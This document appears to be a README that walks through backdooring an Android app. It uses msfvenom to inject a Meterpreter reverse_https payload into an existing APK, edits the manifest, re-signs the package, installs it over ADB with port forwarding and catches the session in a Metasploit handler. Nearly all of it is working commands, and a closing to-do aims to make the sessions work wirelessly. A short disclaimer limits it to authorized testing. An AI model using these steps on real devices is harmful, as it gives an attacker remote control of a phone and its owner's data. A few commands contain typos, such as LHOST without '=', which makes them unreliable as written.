# Meterpreter Session on Android 16 - Samsung Z Flip 5 (2026)

# Android Penetration Testing Workflow: APK Modification & Local Deployment

This repository documents the technical process of injecting a Metasploit payload into an Android application package (APK), engineering the manifest to allow explicit execution, cryptographically signing the binary, and deploying it locally via ADB for security testing.

## Prerequisites

Ensure you have the following tools installed and available in your system path:
* **Metasploit Framework** (`msfvenom`, `msfconsole`)
* **Apktool**
* **Java Development Kit** (`keytool`, `apksigner`)
* **Android Debug Bridge** (`adb`)

---

## Step 1: Payload Generation

Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.

```bash
msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST127.0.0.1 LPORT4444 -o output.apk
```

---

## Step 2: Manifest Engineering

Decompile the binary package to modify its configuration, then recompile it to enforce structural integrity.

### 1. Decompile the APK
```bash
apktool d output.apk -o unpacked_folder
```

### 2. Modify the Manifest
Open `unpacked_folder/AndroidManifest.xml` in a text editor. Configure both primary entry points to explicitly allow OS execution by adding `android:exported="true"`.

```xml
<activity android:name="com.example.app.MainActivity" android:exported="true">
<receiver android:name="com.example.app.qvqna.Ygdsa" android:exported="true">
```

### 3. Recompile the APK
```bash
apktool b unpacked_folder -o example_usb.apk
```

---

## Step 3: Cryptographic Signing

Android environments reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.

```bash
# Generate a development keystore
keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias

# Sign the recompiled APK
apksigner sign --ks my-release-key.jks --out signed_usb.apk example_usb.apk
```

---

## Step 4: System Clearing & Deployment

Clear hanging processes from the local port assignment, reset the network translation layers, and install the application directly to the device's default workspace profile.

```bash
# Clear existing processes on port 4444
sudo kill -9 $(lsof -t -i:4444) 2>/dev/null

# Reset and establish ADB reverse port forwarding
adb reverse --remove-all
adb reverse tcp:4444 tcp:4444

# Remove old installations and force-install the new package
adb uninstall com.example.app
adb install --user 0 -r -d -g signed_usb.apk
```

---

## Step 5: Session Handling & Execution

Initialize the Metasploit framework locally to listen for the incoming reverse connection.

```bash
msfconsole
```

Inside the Metasploit console, execute the following handler configuration:

```rc
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 127.0.0.1
set LPORT 4444
set IgnorePayloadUUIDs true
exploit
```

Force the device interface activity layer into the foreground, then trigger the underlying execution broadcast intent to catch the core session:

```bash
# Force-start the main activity
adb shell am start -n com.example.app/com.example.app.MainActivity

# Trigger the broadcast receiver
adb shell am broadcast -n com.example.app/com.example.app.qvqna.Ygdsa
```

### Expected Output
```text
[*] Meterpreter session 1 opened successfully established.
```
### To Do

Currently it only works with ADB plugged into USB. Need to figure out wireless meterpreter sessions.
Android 16 seems to block it in every configuration I've tried so far...

---
**Disclaimer:** This guide is for educational and authorized security testing purposes only.
